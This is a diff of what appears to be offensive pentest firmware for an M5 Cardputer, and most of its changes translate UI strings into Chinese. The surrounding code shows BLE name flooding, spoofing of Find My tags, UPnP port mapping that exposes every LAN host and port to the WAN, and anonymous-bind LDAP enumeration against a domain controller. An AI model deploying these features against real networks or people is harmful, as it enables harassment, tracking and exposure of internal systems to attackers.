+    html += "<textarea class='block' name='msg' rows='3' maxlength='1024' placeholder='在此输入您的秘密留言...'></textarea>";
+    html += "<button class='block' type='submit'>发布留言</button></form>";
 
-    html += "<p style='margin-top:20px'><a href='/dd-list'>&#128193; View Deposits</a></p>";
+    html += "<p style='margin-top:20px'><a href='/dd-list'>&#128193; 查看所有存件箱</a></p>";
     html += "<hr style='border:0;border-top:1px solid #333;margin:20px 0'>";
     html += "<small>Connected to <span style='color:#0ff'>" + WiFi.softAPIP().toString() + "</span></small>";
 
@@ -29436,10 +29664,10 @@ void setupDeadDropRoutesSync() {
     html += "function human(x){if(x<1024)return x+' B';if(x<1048576)return(x/1024).toFixed(1)+' KB';if(x<1073741824)return(x/1048576).toFixed(1)+' MB';return(x/1073741824).toFixed(1)+' GB';}";
     html += "function up(){";
     html += " var f=document.getElementById('f').files[0];";
-    html += " if(!f){alert('Select a file');return;}";
+    html += " if(!f){alert('请先选择要上传的文件！');return;}";
     html += " var p=document.getElementById('prog');";
     html += " var s=document.getElementById('status');";
-    html += " p.style.display='block';p.value=0;s.textContent='Starting upload...';";
+    html += " p.style.display='block';p.value=0;s.textContent='正在开始上传...';";
     html += " var start=Date.now();";
     html += " var xhr=new XMLHttpRequest();xhr.open('POST','/dd-upload',true);";
     html += " xhr.upload.onprogress=function(e){";
@@ -29451,8 +29679,8 @@ void setupDeadDropRoutesSync() {
     html += "     s.textContent='Uploading '+percent+'% ('+human(e.loaded)+' / '+human(e.total)+', '+speed+' KB/s)';";
     html += "   }";
     html += " };";
-    html += " xhr.onload=function(){s.textContent='Upload complete';window.location='/dd-list';};";
-    html += " xhr.onerror=function(){s.textContent='Upload failed';};";
+    html += " xhr.onload=function(){s.textContent='上传成功！';window.location='/dd-list';};";
+    html += " xhr.onerror=function(){s.textContent='上传失败，请重试！';};";
     html += " var form=new FormData();form.append('data',f,f.name);xhr.send(form);";
     html += "}";
     html += "</script>";
@@ -29477,8 +29705,8 @@ void setupDeadDropRoutesSync() {
     html += "th,td{text-align:left;padding:6px;border-bottom:1px solid #222;}";
     html += "th{color:#0ff;font-size:14px;} td{font-size:13px;}";
     html += "</style></head><body>";
-    html += "<h3>📂 Uploaded Files</h3>";
-    html += "<table><tr><th>Name</th><th>Size</th></tr>";
+    html += "<h3>📂 已投递的文件列表</h3>";
+    html += "<table><tr><th>文件名</th><th>大小</th></tr>";
     while (true) {
       File f = dir.openNextFile();
       if (!f) break;
@@ -29495,7 +29723,7 @@ void setupDeadDropRoutesSync() {
       f.close();
     }
     dir.close();
-    html += "</table><p><a href='/'>⬅ Back</a></p></body></html>";
+    html += "</table><p><a href='/'>⬅ 返回信箱首页</a></p></body></html>";
     server.send(200, "text/html", html);
   });
 
@@ -29618,7 +29846,7 @@ void WifiDeadDrop() {
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_MODE_APSTA);
 
-  waitAndReturnToMenu("Dead Drop stopped");
+  waitAndReturnToMenu("数字死信箱已停止");
 }
 DEAD CODE END */
 
@@ -29666,7 +29894,7 @@ String generateRandomBLEName_Full() {
 // ======================================================
 inline void uiHeader(const char* title) {
   M5.Display.fillRect(0, 0, 240, 135, TFT_BLACK);
-  M5.Display.setTextSize(2);
+  evilSetCnFont(M5.Display, 2);
   M5.Display.setTextColor(TFT_CYAN);
   int tw = M5.Display.textWidth(title);
   M5.Display.setCursor((240 - tw) / 2, 8);
@@ -29675,21 +29903,21 @@ inline void uiHeader(const char* title) {
   M5.Display.fillRect(0, 28, 240, 2, TFT_PURPLE);
   M5.Display.drawRect(6, 34, 228, 88, TFT_PURPLE);
 
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_WHITE);
   M5.Display.setCursor(8, 126);
-  M5.Display.print("BACKSPACE: exit");
+  M5.Display.print("退格键: 退出");
 }
 
 inline void uiStaticLabels(const char* modeText) {
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(TFT_WHITE);
 
-  M5.Display.setCursor(14, 40);  M5.Display.print("MODE:");
-  M5.Display.setCursor(14, 58);  M5.Display.print("NAME:");
-  M5.Display.setCursor(14, 76);  M5.Display.print("ADS :");
-  M5.Display.setCursor(14, 94);  M5.Display.print("TIME:");
-  M5.Display.setCursor(130, 94); M5.Display.print("RATE:");
+  M5.Display.setCursor(14, 40);  M5.Display.print("模式:");
+  M5.Display.setCursor(14, 58);  M5.Display.print("名称:");
+  M5.Display.setCursor(14, 76);  M5.Display.print("广播:");
+  M5.Display.setCursor(14, 94);  M5.Display.print("时间:");
+  M5.Display.setCursor(130, 94); M5.Display.print("速率:");
 
   M5.Display.setTextColor(TFT_YELLOW);
   M5.Display.setCursor(62, 40);
@@ -29701,12 +29929,12 @@ inline void uiStaticLabels(const char* modeText) {
 
 // ===== SPEED UI LABEL =============================================
 inline void uiUpdateSpeedLabel(int mode) {
-  const char* txt[] = { "NORMAL", "TURBO", "SLOW" };
+  const char* txt[] = { "正常", "极速", "慢速" };
   uint16_t color[] = { TFT_DARKGREY, TFT_RED, TFT_BLUE };
 
   M5.Display.fillRect(130, 76, 100, 14, TFT_BLACK);
   M5.Display.setCursor(130, 76);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(color[mode]);
   M5.Display.print(txt[mode]);
 }
@@ -29728,10 +29956,10 @@ inline uint32_t wheel(byte pos) {
 //             BLE NameFlood Main Function
 // ======================================================
 void bleNameFloodUI() {
-  bool useRandom = confirmPopup("Use RANDOM names?");
+  bool useRandom = confirmPopup("使用随机名称?");
 
-  uiHeader("BLE NameFlood");
-  uiStaticLabels(useRandom ? "RANDOM" : "SD FILE");
+  uiHeader("蓝牙名称洪泛");
+  uiStaticLabels(useRandom ? "随机" : "SD文件");
   uiUpdateSpeedLabel(0);
 
   std::vector<String> bleNames;
@@ -29743,7 +29971,7 @@ void bleNameFloodUI() {
       if (!f) {
         M5.Display.setTextColor(TFT_RED);
         M5.Display.setCursor(14, 60);
-        M5.Display.println("Error creating /evil/ble/names.txt");
+        M5.Display.println("创建 /evil/ble/names.txt 失败");
         delay(2000); inMenu = true; return;
       }
       f.println("Evil👹Beacon"); f.println("💀HackMyPhone"); f.println("😈FreeVirusWiFi");
@@ -29759,7 +29987,7 @@ void bleNameFloodUI() {
     if (!file) {
       M5.Display.setTextColor(TFT_RED);
       M5.Display.setCursor(14, 60);
-      M5.Display.println("SD read error.");
+      M5.Display.println("SD卡读取错误");
       delay(2000);
       inMenu = true;
       return;
@@ -29772,7 +30000,7 @@ void bleNameFloodUI() {
     if (bleNames.empty()) {
       M5.Display.setTextColor(TFT_RED);
       M5.Display.setCursor(14, 60);
-      M5.Display.println("No names in file!");
+      M5.Display.println("文件中无名称!");
       delay(2000);
       inMenu = true;
       return;
@@ -29809,7 +30037,7 @@ void bleNameFloodUI() {
     M5.Display.fillRect(50, 92, 70, 16, TFT_BLACK);
     M5.Display.fillRect(170, 92, 50, 16, TFT_BLACK);
 
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_CYAN);
     M5.Display.setCursor(62, 58);
     String shown = nm; if (shown.length() > 18) shown = shown.substring(0, 18);
@@ -29935,7 +30163,7 @@ void bleNameFloodUI() {
   pixels.show();
   M5.Display.fillCircle(220, 20, 4, TFT_RED);
   delay(120);
-  waitAndReturnToMenu("BLENameFlood stopped");
+  waitAndReturnToMenu("蓝牙名称洪泛已停止");
 }
 
 
@@ -30078,12 +30306,12 @@ void atDrawHeader(bool force = false) {
   atLastHeaderUpdate = now;
 
   M5.Display.fillRect(0, 0, 240, AT_HDR_H, AT_ACCENT);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_BLACK, AT_ACCENT);
   M5.Display.setCursor(6, 4);
-  M5.Display.print("Wall of AirTags");
+  M5.Display.print("AirTag 监控墙");
   char buf[24];
-  snprintf(buf, sizeof(buf), "Total: %d", atCount);
+  snprintf(buf, sizeof(buf), "总数: %d", atCount);
   int w = M5.Display.textWidth(buf);
   M5.Display.setCursor(240 - w - 6, 4);
   M5.Display.print(buf);
@@ -30130,7 +30358,7 @@ void atDrawList(bool force = false) {
     else if (item.trend == "Farther") color = TFT_BLUE;
 
     // Indicateur de sélection '>'
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     if (idx == atSel) {
       M5.Display.setTextColor(AT_TEXT, AT_BG);
       M5.Display.setCursor(5, y);
@@ -30141,7 +30369,7 @@ void atDrawList(bool force = false) {
     }
 
     // Ligne
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     M5.Display.setTextColor(color, AT_BG);
     M5.Display.setCursor(12, y);           // décale pour laisser le '>'
     M5.Display.print(left);
@@ -30162,10 +30390,10 @@ void atDrawSpamBox(bool force = false) {
   int y = 135 - AT_SPAM_H;
 
   M5.Display.drawRoundRect(3, y, 234, AT_SPAM_H - 4, 5, AT_MUTED);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(AT_MUTED, AT_BG);
   M5.Display.setCursor(10, y + 2);
-  M5.Display.print("BLE Frame (last seen) ");
+  M5.Display.print("BLE 帧 (最近发现) ");
 
   M5.Display.fillRect(5, y + 14, 230, AT_SPAM_H - 20, AT_BG);
   M5.Display.setTextColor(AT_TEXT, AT_BG);
@@ -30264,27 +30492,27 @@ void showAtDetails(int idx) {
 
   // Ecran d'info
   M5.Display.fillScreen(AT_BG);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(AT_TEXT);
 
   int y = 8;
   const int lh = 13;  // line height confortable en size=1
 
-  M5.Display.setCursor(10, y);           M5.Display.print("INFO AirTag"); y += lh + 2;
+  M5.Display.setCursor(10, y);           M5.Display.print("AirTag 详情"); y += lh + 2;
   M5.Display.drawLine(10, y, 230, y, AT_MUTED); y += 6;
 
   M5.Display.setCursor(10, y);           M5.Display.print("MAC: ");  M5.Display.print(i.mac);                 y += lh;
   M5.Display.setCursor(10, y);           M5.Display.print("RSSI: "); M5.Display.print(i.rssi); M5.Display.print(" dBm"); y += lh;
-  M5.Display.setCursor(10, y);           M5.Display.print("Trend: "); M5.Display.print(i.trend);              y += lh;
-  M5.Display.setCursor(10, y);           M5.Display.print("Dist: ");  M5.Display.print(String(i.distance, 2)); M5.Display.print(" m"); y += lh;
+  M5.Display.setCursor(10, y);           M5.Display.print("趋势: "); M5.Display.print(i.trend == "Closer" ? "靠近" : (i.trend == "Farther" ? "远离" : "稳定")); y += lh;
+  M5.Display.setCursor(10, y);           M5.Display.print("距离: ");  M5.Display.print(String(i.distance, 2)); M5.Display.print(" m"); y += lh;
 
   // Nom / UUID (tronqués proprement à l'affichage)
-  M5.Display.setCursor(10, y);           M5.Display.print("Name: ");  M5.Display.print(fitLeft(i.name, 26));   y += lh;
+  M5.Display.setCursor(10, y);           M5.Display.print("名称: ");  M5.Display.print(fitLeft(i.name, 26));   y += lh;
   M5.Display.setCursor(10, y);           M5.Display.print("UUID: ");  M5.Display.print(fitLeft(i.uuid, 26));   y += lh + 6;
 
   M5.Display.setTextColor(AT_MUTED, AT_BG);
   M5.Display.setCursor(10, 120);
-  M5.Display.print("Backspace to quit");
+  M5.Display.print("按退格键退出");
 
   for (;;) {
     cardUpdate();
@@ -30434,7 +30662,7 @@ void wallOfAirTags() {
     atDrawSpamBox(false);
   }
 
-  waitAndReturnToMenu("Scan stopped...");
+  waitAndReturnToMenu("扫描已停止...");
 }
 
 
@@ -30697,13 +30925,13 @@ void fmStartTagRaw(const FakeTag& t) {
 
 void fmDrawHeader(bool on) {
   M5.Display.fillRect(0, 0, 240, AT_HDR_H, AT_ACCENT);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_BLACK, AT_ACCENT);
   M5.Display.setCursor(6, 4);
   M5.Display.print("FindMyEvil");
 
   // État ON/OFF
-  const char* s = on ? "ON" : "OFF";
+  const char* s = on ? "开启" : "关闭";
   int w = M5.Display.textWidth(s);
   M5.Display.setCursor(240 - w - 6, 4);
   M5.Display.print(s);
@@ -30718,21 +30946,21 @@ void fmDrawHeader(bool on) {
 
 void fmDrawBody() {
   M5.Display.fillRect(0, AT_LIST_Y, 240, 135 - AT_LIST_Y, AT_BG);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(AT_TEXT, AT_BG);
 
   int y = AT_LIST_Y + 2;
-  M5.Display.setCursor(8, y);   M5.Display.print("Interval: "); M5.Display.print(fmIntMs); M5.Display.print(" ms"); 
+  M5.Display.setCursor(8, y);   M5.Display.print("广播间隔: "); M5.Display.print(fmIntMs); M5.Display.print(" ms"); 
   y += 12;
-  M5.Display.setCursor(8, y);   M5.Display.print("Slot:     "); M5.Display.print(fmSlotMs); M5.Display.print(" ms"); 
+  M5.Display.setCursor(8, y);   M5.Display.print("轮换时隙: "); M5.Display.print(fmSlotMs); M5.Display.print(" ms"); 
   y += 12;
 
   M5.Display.setCursor(8, y);
-  M5.Display.print("Mode: ");
-  M5.Display.print(fmUseFindMy ? "FindMy Keys" : "LAB random");
+  M5.Display.print("模式: ");
+  M5.Display.print(fmUseFindMy ? "SD卡密钥" : "随机生成");
   y += 12;
 
-  M5.Display.setCursor(8, y);   M5.Display.print("Tags:     "); M5.Display.print(fmTagCount);
+  M5.Display.setCursor(8, y);   M5.Display.print("标签数量: "); M5.Display.print(fmTagCount);
   y += 12;
 
   // Aperçu adv_key (tag courant)
@@ -30741,7 +30969,7 @@ void fmDrawBody() {
     for (int i = 0; i < 8; i++) {
       p += snprintf(line + p, sizeof(line) - p, "%02X ", fmTags[fmTagIdx].adv_key[i]);
     }
-    M5.Display.setCursor(8, y); M5.Display.print("KEY: "); M5.Display.print(line); y += 14;
+    M5.Display.setCursor(8, y); M5.Display.print("密钥: "); M5.Display.print(line); y += 14;
 
     char macs[18];
     snprintf(macs, sizeof(macs), "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -30751,11 +30979,11 @@ void fmDrawBody() {
   }
 
   M5.Display.setTextColor(AT_MUTED, AT_BG);
-  M5.Display.setCursor(8, y);   M5.Display.print("[SPACE] ON/OFF  [B] Save mode");
+  M5.Display.setCursor(8, y);   M5.Display.print("[空格] 开关  [B] 息屏省电");
   y += 12;
-  M5.Display.setCursor(8, y);   M5.Display.print("[R] rotate KEY  [+]/[-] interval");
+  M5.Display.setCursor(8, y);   M5.Display.print("[R] 轮换密钥  [+]/[-] 调整间隔");
   y += 12;
-  M5.Display.setCursor(8, y);   M5.Display.print("[N] add tag  [BKSP/ENTER] exit");
+  M5.Display.setCursor(8, y);   M5.Display.print("[N] 添加标签  [退格/回车] 退出");
 }
 
 void fmRedrawAll() {
@@ -30809,7 +31037,7 @@ void FindMyEvilTx() {
       } else {
         // Première mise en route: choix de mode si pas encore fait
         if (!fmModeChosen) {
-          fmUseFindMy = confirmPopup("Use keys from SD?");
+          fmUseFindMy = confirmPopup("使用SD卡中的密钥?");
           fmModeChosen      = true;
 
           if (fmUseFindMy) {
@@ -30954,7 +31182,7 @@ void FindMyEvilTx() {
 
   // Sortie propre
   if (fmTxOn) fmStopRawAdv();
-  waitAndReturnToMenu("FindMyEvil desactivated...");
+  waitAndReturnToMenu("FindMyEvil 已停用...");
 }
 
 
@@ -31074,7 +31302,7 @@ int menuSelectList(const std::vector<String>& items, const char* title) {
     int lastIndex = -1;
 
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setCursor(5, 5);
     M5.Display.println(title);
 
@@ -31397,9 +31625,9 @@ void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
     enterDebounce();
     M5.Display.clear();
     M5.Display.setCursor(5, 0);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.println("FULL AUTO NAT MODE");
+    M5.Display.println("全自动 NAT 模式");
     M5.Display.println("------------------");
 
     static const uint16_t portsToTest[] = {
@@ -31433,7 +31661,7 @@ void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
             uint16_t externalPort = extBase + mapCount;
             bool success = upnpAddPortMapping(target, p, externalPort);
 
-            String line = (success ? "[OK] " : "[FAIL] ");
+            String line = (success ? "[成功] " : "[失败] ");
             line += target.toString() + ":" + String(p);
             if (success) {
                 line += " → " + String(externalPort);
@@ -31453,7 +31681,7 @@ void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
             }
 
             if (kp(KEY_BACKSPACE)) {
-                waitAndReturnToMenu("Stopped by user");
+                waitAndReturnToMenu("用户已停止");
                 return;
             }
 
@@ -31465,14 +31693,14 @@ void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
     String wan = getExternalWANIP();
     M5.Display.clear();
     M5.Display.setCursor(5, 0);
-    M5.Display.setTextSize(1.5);
-    M5.Display.println("DONE.");
-    M5.Display.println("WAN IP:");
+    evilSetCnFont(M5.Display, 1.5);
+    M5.Display.println("完成.");
+    M5.Display.println("公网 IP:");
     M5.Display.println(wan);
-    M5.Display.println("Mapped: " + String(mapCount));
+    M5.Display.println("已映射: " + String(mapCount));
     delay(4000);
 
-    waitAndReturnToMenu("Auto NAT done");
+    waitAndReturnToMenu("自动 NAT 完成");
 }
 
 
@@ -31480,7 +31708,7 @@ void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
 
 void upnpTargetNATWorkflow() {
     if (WiFi.localIP().toString() == "0.0.0.0") {
-      waitAndReturnToMenu("Not connected...");
+      waitAndReturnToMenu("未连接网络...");
       return;
     } 
     enterDebounce();
@@ -31493,9 +31721,9 @@ void upnpTargetNATWorkflow() {
     // Affichage initial
     M5.Display.clear();
     M5.Display.setCursor(5, 5);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-    M5.Display.println("Starting ARP scan...");
+    M5.Display.println("开始 ARP 扫描...");
     delay(600);
 
     // ARP passif et table
@@ -31505,9 +31733,9 @@ void upnpTargetNATWorkflow() {
     // Booster ARP actif
     M5.Display.clear();
     M5.Display.setCursor(5, 5);
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-    M5.Display.println("Scanning ARP...");
+    M5.Display.println("正在 ARP 扫描...");
 
     int line = 1;
     for (int i = 1; i <= 254; i++) {
@@ -31532,7 +31760,7 @@ void upnpTargetNATWorkflow() {
     }
 
     if (hosts.empty()) {
-        waitAndReturnToMenu("No hosts found");
+        waitAndReturnToMenu("未发现主机");
         return;
     }
 
@@ -31544,19 +31772,19 @@ void upnpTargetNATWorkflow() {
     std::vector<String> labels;
     for (auto ip : hosts) {
         if (ip == selfIP) {
-            labels.push_back(ip.toString() + " - Evil");
+            labels.push_back(ip.toString() + " - 本机");
         } else {
-            String nb = "unknown";
+            String nb = "未知";
             scanNetbiosName(ip, nb);
             labels.push_back(ip.toString() + " - " + nb);
         }
     }
 
     // 🔥 Ajout de l’option ALL
-    labels.push_back("ALL HOSTS + ALL PORTS");
+    labels.push_back("全部主机 + 全部端口");
 
     // Sélection de la cible
-    int idx = menuSelectList(labels, "Select Target");
+    int idx = menuSelectList(labels, "选择目标");
     if (idx < 0) return;
 
     // Mode spécial : ALL
@@ -31573,8 +31801,8 @@ void upnpTargetNATWorkflow() {
 
     if (isSelf) {
         enterDebounce();
-        std::vector<String> selfOptions = {"Use Port 80 (direct)", "Use other (proxy)"};
-        int sel = menuSelectList(selfOptions, "Evil-cardputer mode");
+        std::vector<String> selfOptions = {"使用 80 端口 (直连)", "使用其他端口 (代理)"};
+        int sel = menuSelectList(selfOptions, "本机映射模式");
         if (sel < 0) return;
 
         if (sel == 0) {
@@ -31584,11 +31812,11 @@ void upnpTargetNATWorkflow() {
             enterDebounce();
             M5.Display.clear();
             M5.Display.setCursor(5, 5);
-            M5.Display.println("Proxy local port (ex: 81)");
-            String localPortStr = getUserInput("Proxy local port (ex: 8080):");
+            M5.Display.println("本地代理端口 (例: 81)");
+            String localPortStr = getUserInput("本地代理端口 (例: 8080):");
             uint16_t localPort = localPortStr.toInt();
             if (localPort == 0 || localPort > 65535) {
-                waitAndReturnToMenu("Invalid port");
+                waitAndReturnToMenu("无效端口");
                 return;
             }
 
@@ -31618,14 +31846,14 @@ void upnpTargetNATWorkflow() {
         }
 
         if (openPorts.empty()) {
-            waitAndReturnToMenu("No open ports");
+            waitAndReturnToMenu("无开放端口");
             return;
         }
 
         enterDebounce();
         std::vector<String> portLabels;
-        for (auto p : openPorts) portLabels.push_back("Port " + String(p));
-        int portIdx = menuSelectList(portLabels, "Select Port");
+        for (auto p : openPorts) portLabels.push_back("端口 " + String(p));
+        int portIdx = menuSelectList(portLabels, "选择端口");
         if (portIdx < 0) return;
 
         internalPort = openPorts[portIdx];
@@ -31635,21 +31863,21 @@ void upnpTargetNATWorkflow() {
     enterDebounce();
     M5.Display.clear();
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Set external port:");
-    String p = getUserInput("External port:");
+    M5.Display.println("设置外部端口:");
+    String p = getUserInput("外部端口:");
     uint16_t externalPort = p.toInt();
     if (externalPort == 0 || externalPort > 65535) {
-        waitAndReturnToMenu("Invalid port");
+        waitAndReturnToMenu("无效端口");
         return;
     }
 
     // 🔸 Envoi de la requête UPnP
     M5.Display.clear();
     M5.Display.setCursor(5, 5);
-    M5.Display.println("NAT via UPnP...");
-    M5.Display.println("Target: " + targetIP.toString());
-    M5.Display.println("Internal: " + String(internalPort));
-    M5.Display.println("External: " + String(externalPort));
+    M5.Display.println("正在通过 UPnP 映射...");
+    M5.Display.println("目标: " + targetIP.toString());
+    M5.Display.println("内网端口: " + String(internalPort));
+    M5.Display.println("外网端口: " + String(externalPort));
 
     Serial.println("[UPnP] Requesting NAT for: " + targetIP.toString());
     Serial.println("[UPnP] Internal port: " + String(internalPort));
@@ -31661,11 +31889,11 @@ void upnpTargetNATWorkflow() {
         String wanIP = getExternalWANIP();
         M5.Display.clear();
         M5.Display.setCursor(5, 0);
-        M5.Display.println("Exposed on:\n " + wanIP + ":" + String(externalPort));
+        M5.Display.println("已暴露于:\n " + wanIP + ":" + String(externalPort));
         delay(5000);
         waitAndReturnToMenu((wanIP + ":" + String(externalPort)).c_str());
     } else {
-        waitAndReturnToMenu("NAT failed");
+        waitAndReturnToMenu("NAT 映射失败");
     }
 }
 
@@ -31699,16 +31927,16 @@ String extractXmlTag(const String& xml, const String& tag) {
 
 void listUPnPMappings() {
     if (WiFi.localIP().toString() == "0.0.0.0") {
-        waitAndReturnToMenu("Not connected...");
+        waitAndReturnToMenu("未连接网络...");
         return;
     }
 
     enterDebounce();
     M5.Display.clear();
     M5.Display.setCursor(5, 0);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.println("Listing UPnP");
+    M5.Display.println("正在获取 UPnP 列表");
     M5.Display.println("---------------------");
 
     String controlURL;
@@ -31717,7 +31945,7 @@ void listUPnPMappings() {
     String serviceType;
 
     if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) {
-        waitAndReturnToMenu("UPnP IGD not found");
+        waitAndReturnToMenu("未找到 UPnP 网关");
         return;
     }
 
@@ -31769,7 +31997,7 @@ void listUPnPMappings() {
         int errorCode = extractSoapErrorCode(resp);
         if (errorCode == 713) break; // NoSuchEntryInArray
         if (errorCode != 0) {
-            String err = "UPnP error: " + String(errorCode);
+            String err = "UPnP 错误: " + String(errorCode);
             Serial.println("[UPnP] SOAP Error " + String(errorCode));
             waitAndReturnToMenu(err.c_str());
             return;
@@ -31780,7 +32008,7 @@ void listUPnPMappings() {
         String intClient = extractXmlTag(resp, "NewInternalClient");
 
         if (intPort.isEmpty() || extPort.isEmpty() || intClient.isEmpty()) {
-            snprintf(lineBuffer, sizeof(lineBuffer), "[Invalid]");
+            snprintf(lineBuffer, sizeof(lineBuffer), "[无效条目]");
         } else {
             snprintf(lineBuffer, sizeof(lineBuffer), "%s > %s:%s", 
                      extPort.c_str(), intClient.c_str(), intPort.c_str());
@@ -31801,13 +32029,13 @@ void listUPnPMappings() {
         index++;
 
         if (kp(KEY_BACKSPACE)) {
-            waitAndReturnToMenu("Stopped");
+            waitAndReturnToMenu("已停止");
             return;
         }
     }
         cursorY += 13;
         M5.Display.setCursor(5, cursorY);
-        M5.Display.println("- End -");
+        M5.Display.println("- 结束 -");
 
     while (!kp(KEY_BACKSPACE)) {
         cardUpdate();
@@ -31815,9 +32043,9 @@ void listUPnPMappings() {
     }
 
     if (index == 0) {
-        waitAndReturnToMenu("No mappings found");
+        waitAndReturnToMenu("未发现映射条目");
     } else {
-        waitAndReturnToMenu("End of list");
+        waitAndReturnToMenu("列表结束");
     }
 }
 
@@ -31850,22 +32078,22 @@ static bool   ldapLogFollow  = true; // true = auto-scroll vers le bas pendant l
 // Contexte pour le header
 static IPAddress ldapUiDcIP;
 static String    ldapUiBaseDN  = "";
-static String    ldapUiPhase   = "IDLE";  // "SCAN", "BIND", "DUMP", etc.
+static String    ldapUiPhase   = "空闲";  // "SCAN", "BIND", "DUMP", etc.
 
 // Dessine le header + contexte (phase, DC, BaseDN)
 void ldapUiDrawHeader()
 {
   M5.Display.fillScreen(TFT_BLACK);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
 
   // Ligne 1 : titre
   M5.Display.setCursor(5, 0);
-  M5.Display.println("[ LDAP ENUM / LOG ]");
+  M5.Display.println("[ LDAP 枚举 / 日志 ]");
 
   // Ligne 2 : DC
   M5.Display.setCursor(5, 10);
-  String dcLine = "DC: " + ldapUiDcIP.toString() + "  Phase: " + ldapUiPhase;
+  String dcLine = "域控: " + ldapUiDcIP.toString() + "  阶段: " + ldapUiPhase;
   M5.Display.println(dcLine);
 
   // Ligne 3 : BaseDN (tronquée si trop longue)
@@ -31885,7 +32113,7 @@ void ldapUiDrawHeader()
 void ldapUiDrawLogs()
 {
   // On part après le header (30 px ≈ 4 lignes)
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
   M5.Display.setCursor(5, 40);
 
@@ -31917,11 +32145,11 @@ void ldapUiDrawLogs()
              ? (first / LDAP_LOG_PAGE_LINES) + 1
              : 1;
   snprintf(info, sizeof(info),
-           "--- %d/%d lines (Pg %d) ---",
+           "--- %d/%d 行 (第 %d 页) ---",
            last, total, page);
   M5.Display.println(info);
 
-  M5.Display.println("[↑/W] UP  [↓/S] DOWN  [ESC] BACK");
+  M5.Display.println("[;] 上翻  [.] 下翻  [退格] 返回");
 }
 
 // Redraw complet (header + logs)
@@ -31935,7 +32163,7 @@ void ldapUiResetLog(const IPAddress &dcIP, const String &baseDN)
 {
   ldapUiDcIP   = dcIP;
   ldapUiBaseDN = baseDN;
-  ldapUiPhase  = "INIT";
+  ldapUiPhase  = "初始化";
 
   ldapLogCount  = 0;
   ldapLogScroll = 0;
@@ -32564,22 +32792,22 @@ bool detectAndBindToDC(IPAddress &dcIP)
     // === Step 1 — Ask user for /24 or IP ===
     M5.Display.clear();
     M5.Display.setCursor(5, 0);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-    M5.Display.println("Enter /24 or IP:");
+    M5.Display.println("输入 /24 网段或 IP:");
     IPAddress local = WiFi.localIP();
-    M5.Display.print("Current : ");
+    M5.Display.print("当前 IP: ");
     M5.Display.println(local.toString());    
     enterDebounce();
 
-    String netInput = getUserInput("NET or IP:");
+    String netInput = getUserInput("网段或 IP:");
     netInput.trim();
     Serial.println("[INPUT] User typed: " + netInput);
 
     if (netInput.length() < 7 || netInput.indexOf('.') == -1)
     {
         Serial.println("[ERROR] Invalid IP or /24 format.");
-        waitAndReturnToMenu("Invalid IP");
+        waitAndReturnToMenu("无效 IP");
         return false;
     }
 
@@ -32598,7 +32826,7 @@ bool detectAndBindToDC(IPAddress &dcIP)
 
     // Initialiser console UI
     ldapUiResetLog(IPAddress(0,0,0,0), "");
-    ldapUiSetPhase("SCAN");
+    ldapUiSetPhase("扫描");
 
     if (isSingleIP){
         // ─────────────────────────────────────────────
@@ -32606,36 +32834,36 @@ bool detectAndBindToDC(IPAddress &dcIP)
         // ─────────────────────────────────────────────
         if (!dcIP.fromString(netInput)) {
             Serial.println("[ERROR] Invalid IP format");
-            ldapUiLogLine("[ERROR] Invalid IP format");
-            waitAndReturnToMenu("Invalid IP");
+            ldapUiLogLine("[错误] IP 格式无效");
+            waitAndReturnToMenu("无效 IP");
             return false;
         }
 
-        ldapUiLogLine("[MODE] Direct IP: " + dcIP.toString());
+        ldapUiLogLine("[模式] 直连 IP: " + dcIP.toString());
 
         // Test simple bind (juste pour valider la présence LDAP)
         WiFiClient c;
         bool reachable = false;
         if (c.connect(dcIP, 389)) {
-            ldapUiLogLine("[TEST] Checking LDAP port...");
+            ldapUiLogLine("[测试] 正在检查 LDAP 端口...");
             if (ldapBind(c, "", "")) {
-                ldapUiLogLine("[TEST] Simple bind OK");
+                ldapUiLogLine("[测试] 匿名绑定成功");
